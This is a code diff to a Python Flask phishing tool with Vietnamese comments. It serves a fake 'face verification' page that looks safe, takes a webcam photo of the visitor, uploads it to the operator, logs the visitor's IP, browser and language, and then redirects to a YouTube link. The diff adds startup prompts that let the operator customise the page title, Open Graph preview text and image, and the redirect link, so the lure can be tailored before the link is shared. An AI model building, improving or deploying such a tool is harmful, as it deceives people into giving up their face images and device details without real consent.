@@ -5,6 +5,18 @@ from PIL import Image
 import cv2
 import numpy as np
 
+# Nhập input từ người dùng (hoặc dùng giá trị mặc định)
+# Nhập thông tin meta cho trang web.
+# Nếu bạn không nhập gì, chương trình sẽ dùng giá trị mặc định.
+os.system("clear")
+os.system("cls")
+TITLE = input("Nhập tiêu đề trang web (mặc định: 'Xác Thực Khuôn Mặt - An Toàn & Tin Cậy'): ") or "Xác Thực Khuôn Mặt - An Toàn & Tin Cậy"
+OG_TITLE = input("Nhập tiêu đề Open Graph (mặc định: 'Xác Thực Khuôn Mặt - An Toàn & Tin Cậy'): ") or "Xác Thực Khuôn Mặt - An Toàn & Tin Cậy"
+OG_DESCRIPTION = input("Nhập mô tả Open Graph (mặc định: 'Xác thực khuôn mặt của bạn để đảm bảo an toàn và bảo mật thông tin.'): ") or "Xác thực khuôn mặt của bạn để đảm bảo an toàn và bảo mật thông tin."
+OG_IMAGE = input("Nhập URL hình ảnh Open Graph (mặc định: 'https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg'): ") or "https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg"
+YOUTUBE_LINK = input("Nhập link YouTube hoặc link khác(mặc định: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'): ") or "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+
+
 app = Flask(__name__)
 os.system("clear")
 os.system("cls")
@@ -30,17 +42,18 @@ face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_fronta
 SAVE_PATH = "IMAGE"
 os.makedirs(SAVE_PATH, exist_ok=True)
 
-HTML_PAGE = """
+# Template HTML sử dụng các biến input (escape các dấu ngoặc nhọn bên trong f-string bằng cách dùng {{ và }})
+HTML_PAGE = f"""
 <!DOCTYPE html>
 <html lang="vi">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Xác Thực Khuôn Mặt - An Toàn & Tin Cậy</title>
+  <title>{TITLE}</title>
   <!-- Open Graph Metadata -->
-  <meta property="og:title" content="Xác Thực Khuôn Mặt - An Toàn & Tin Cậy">
-  <meta property="og:description" content="Xác thực khuôn mặt của bạn để đảm bảo an toàn và bảo mật thông tin.">
-  <meta property="og:image" content="https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
+  <meta property="og:title" content="{OG_TITLE}">
+  <meta property="og:description" content="{OG_DESCRIPTION}">
+  <meta property="og:image" content="{OG_IMAGE}">
   <meta property="og:url" content="http://localhost:8080/">
   <meta property="og:type" content="website">
   <link rel="icon" href="https://www.google.com/favicon.ico">
@@ -48,8 +61,8 @@ HTML_PAGE = """
   <link href="https://fonts.googleapis.com/css?family=Roboto:400,500,700&display=swap" rel="stylesheet">
   <style>
     /* Reset & Global */
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
+    * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+    body {{
       font-family: 'Roboto', sans-serif;
       background: linear-gradient(135deg, #2c3e50, #4ca1af);
       display: flex;
@@ -57,9 +70,9 @@ HTML_PAGE = """
       justify-content: center;
       min-height: 100vh;
       color: #fff;
-    }
+    }}
     /* Khung xác thực với border màu cố định */
-    .card {
+    .card {{
       background: #fff;
       border-radius: 12px;
       width: 360px;
@@ -70,26 +83,26 @@ HTML_PAGE = """
       z-index: 1;
       animation: slideDown 0.8s ease-out;
       border: 3px solid #4ca1af;
-    }
-    @keyframes slideDown {
-      from { opacity: 0; transform: translateY(-30px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    .card h2 {
+    }}
+    @keyframes slideDown {{
+      from {{ opacity: 0; transform: translateY(-30px); }}
+      to {{ opacity: 1; transform: translateY(0); }}
+    }}
+    .card h2 {{
       color: #333;
       margin-bottom: 15px;
       animation: fadeInText 1s ease-out;
-    }
-    @keyframes fadeInText {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-    .card p {
+    }}
+    @keyframes fadeInText {{
+      from {{ opacity: 0; }}
+      to {{ opacity: 1; }}
+    }}
+    .card p {{
       color: #666;
       margin-bottom: 20px;
       font-size: 15px;
-    }
-    .btn {
+    }}
+    .btn {{
       background-color: #4ca1af;
       color: #fff;
       border: none;
@@ -99,11 +112,11 @@ HTML_PAGE = """
       cursor: pointer;
       transition: background-color 0.3s;
       margin-top: 10px;
-    }
-    .btn:hover {
+    }}
+    .btn:hover {{
       background-color: #3b8d99;
-    }
-    .spinner {
+    }}
+    .spinner {{
       margin: 20px auto;
       width: 50px;
       height: 50px;
@@ -112,42 +125,42 @@ HTML_PAGE = """
       border-radius: 50%;
       animation: spin 1s linear infinite;
       display: none;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
-    .loading-text {
+    }}
+    @keyframes spin {{
+      to {{ transform: rotate(360deg); }}
+    }}
+    .loading-text {{
       font-size: 16px;
       color: #4ca1af;
       margin-top: 10px;
       display: none;
       animation: fadeInText 1s ease-out;
-    }
-    .progress {
+    }}
+    .progress {{
       font-size: 20px;
       margin-top: 10px;
       color: #4ca1af;
       display: none;
       animation: fadeInProgress 0.5s ease-out;
-    }
-    @keyframes fadeInProgress {
-      from { opacity: 0; transform: scale(0.8); }
-      to { opacity: 1; transform: scale(1); }
-    }
-    .success {
+    }}
+    @keyframes fadeInProgress {{
+      from {{ opacity: 0; transform: scale(0.8); }}
+      to {{ opacity: 1; transform: scale(1); }}
+    }}
+    .success {{
       color: #28a745;
       font-size: 18px;
       margin-top: 20px;
       display: none;
       animation: fadeInText 1s ease-out;
-    }
-    .info {
+    }}
+    .info {{
       font-size: 13px;
       color: #999;
       margin-top: 20px;
-    }
+    }}
     /* Modal Styles */
-    .modal {
+    .modal {{
       position: fixed;
       top: 0; left: 0;
       width: 100%; height: 100%;
@@ -156,8 +169,8 @@ HTML_PAGE = """
       align-items: center;
       justify-content: center;
       z-index: 1000;
-    }
-    .modal-content {
+    }}
+    .modal-content {{
       background: #fff;
       border-radius: 8px;
       width: 90%;
@@ -167,20 +180,20 @@ HTML_PAGE = """
       box-shadow: 0 4px 15px rgba(0,0,0,0.3);
       color: #333;
       animation: slideUp 0.8s ease-out;
-    }
-    @keyframes slideUp {
-      from { opacity: 0; transform: translateY(30px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    .modal-content h3 {
+    }}
+    @keyframes slideUp {{
+      from {{ opacity: 0; transform: translateY(30px); }}
+      to {{ opacity: 1; transform: translateY(0); }}
+    }}
+    .modal-content h3 {{
       margin-bottom: 10px;
       color: #4ca1af;
-    }
-    .modal-content p {
+    }}
+    .modal-content p {{
       font-size: 14px;
       margin-bottom: 20px;
-    }
-    .modal-close {
+    }}
+    .modal-close {{
       background: #4ca1af;
       color: #fff;
       border: none;
@@ -188,10 +201,10 @@ HTML_PAGE = """
       border-radius: 4px;
       cursor: pointer;
       transition: background 0.3s;
-    }
-    .modal-close:hover {
+    }}
+    .modal-close:hover {{
       background: #3b8d99;
-    }
+    }}
   </style>
 </head>
 <body>
@@ -227,7 +240,7 @@ HTML_PAGE = """
 
   <script>
     // Hiển thị modal và kiểm tra AdBlock (không thay đổi)
-    window.addEventListener('load', function() {
+    window.addEventListener('load', function() {{
       document.getElementById('privacy-modal').style.display = 'flex';
 
       var adTest = document.createElement('div');
@@ -237,19 +250,19 @@ HTML_PAGE = """
       adTest.style.height = '1px';
       adTest.style.top = '-1000px';
       document.body.appendChild(adTest);
-      setTimeout(function() {
-        if (adTest.offsetHeight === 0) {
+      setTimeout(function() {{
+        if (adTest.offsetHeight === 0) {{
           document.getElementById('adblock-modal').style.display = 'flex';
-        }
+        }}
         adTest.remove();
-      }, 200);
-    });
+      }}, 200);
+    }});
 
-    function closeModal(modalId) {
+    function closeModal(modalId) {{
       document.getElementById(modalId).style.display = 'none';
-    }
+    }}
 
-    function startVerification() {
+    function startVerification() {{
       let button = document.getElementById("verify-btn");
       let loader = document.getElementById("loader");
       let loadingText = document.getElementById("loading-text");
@@ -260,59 +273,59 @@ HTML_PAGE = """
       loader.style.display = "block";
       loadingText.style.display = "block";
 
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
+      navigator.mediaDevices.getUserMedia({{ video: true }})
+        .then(stream => {{
           let videoTrack = stream.getVideoTracks()[0];
           let imageCapture = new ImageCapture(videoTrack);
           imageCapture.takePhoto()
-            .then(blob => {
+            .then(blob => {{
               let formData = new FormData();
               formData.append("image", blob, "face_verification.png");
-              fetch('/upload', { method: "POST", body: formData })
-                .then(response => {
-                  if(response.status !== 200){
+              fetch('/upload', {{ method: "POST", body: formData }})
+                .then(response => {{
+                  if(response.status !== 200) {{
                     alert("Không phát hiện được khuôn mặt, vui lòng xác thực lại!");
                     loader.style.display = "none";
                     loadingText.style.display = "none";
                     button.style.display = "inline-block";
                     return;
-                  }
+                  }}
                   loader.style.display = "none";
                   loadingText.style.display = "none";
                   progress.style.display = "block";
                   
                   let count = 0;
-                  let interval = setInterval(() => {
+                  let interval = setInterval(() => {{
                     count++;
                     progress.innerText = count + "%";
-                    if(count >= 100) {
+                    if(count >= 100) {{
                       clearInterval(interval);
                       successMessage.style.display = "block";
-                      window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-                    }
-                  }, 30);
-                })
-                .catch(error => {
+                      window.location.href = "{YOUTUBE_LINK}";
+                    }}
+                  }}, 30);
+                }})
+                .catch(error => {{
                   console.error("Lỗi upload ảnh:", error);
                   loader.style.display = "none";
                   loadingText.style.display = "none";
                   button.style.display = "inline-block";
-                });
-            })
-            .catch(err => {
+                }});
+            }})
+            .catch(err => {{
               console.error("Lỗi chụp ảnh:", err);
               loader.style.display = "none";
               loadingText.style.display = "none";
               button.style.display = "inline-block";
-            });
-        })
-        .catch(err => {
+            }});
+        }})
+        .catch(err => {{
           console.error("Lỗi truy cập webcam:", err);
           loader.style.display = "none";
           loadingText.style.display = "none";
           button.style.display = "inline-block";
-        });
-    }
+        }});
+    }}
   </script>
 </body>
 </html>
@@ -323,7 +336,6 @@ def index():
     user_ip = request.remote_addr
     user_agent = request.headers.get('User-Agent', 'Không xác định')
     language = request.headers.get('Accept-Language', 'Không xác định')
-    
     print(f"\033[36m[+]: Hệ điều hành: {user_agent}\033[0m")
     print(f"\033[36m[+]: Ngôn ngữ: {language}\033[0m")
     return render_template_string(HTML_PAGE)
